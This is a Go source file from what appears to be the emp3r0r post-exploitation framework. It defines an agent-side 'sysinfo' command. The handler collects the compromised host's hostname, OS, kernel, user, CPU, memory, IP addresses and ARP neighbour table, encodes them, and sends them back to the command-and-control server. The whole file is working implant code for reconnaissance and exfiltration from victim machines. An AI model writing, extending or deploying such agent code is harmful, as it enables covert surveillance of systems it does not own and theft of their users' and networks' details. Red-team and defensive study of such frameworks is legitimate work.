package handler

import (
	"fmt"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func sysinfoCmdRun(cmd *cobra.Command, args []string) {
	// Parse flags
	cpu, _ := cmd.Flags().GetBool("cpu")
	mem, _ := cmd.Flags().GetBool("mem")
	osInfo, _ := cmd.Flags().GetBool("os")
	net, _ := cmd.Flags().GetBool("net")
	user, _ := cmd.Flags().GetBool("user")
	full, _ := cmd.Flags().GetBool("full")

	var info *def.Emp3r0rAgent

	// Default to full if no specific flag is set
	if full || (!cpu && !mem && !osInfo && !net && !user) {
		info = agentutils.CollectFullSystemInfo()
	} else {
		info = &def.Emp3r0rAgent{}
		// Only collect what is requested
		if osInfo || user {
			details := agentutils.GatherSystemDetails()
			if osInfo {
				info.Hostname = details.Hostname
				info.OS = details.OS
				info.Kernel = details.Kernel
				info.Arch = details.Arch
			}
			if user {
				info.User = details.User
			}
		}
		if cpu {
			info.CPU = util.GetCPUInfo()
		}
		if mem {
			info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
		}
		if net {
			info.IPs = netutil.IPa()
			info.ARP = netutil.IPNeigh()
			info.Transport = def.Transport
		}
	}

	data, err := cbor.Marshal(info)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v\n", err)
		return
	}
	c2transport.NotifyC2Binary(cmd, data)
}
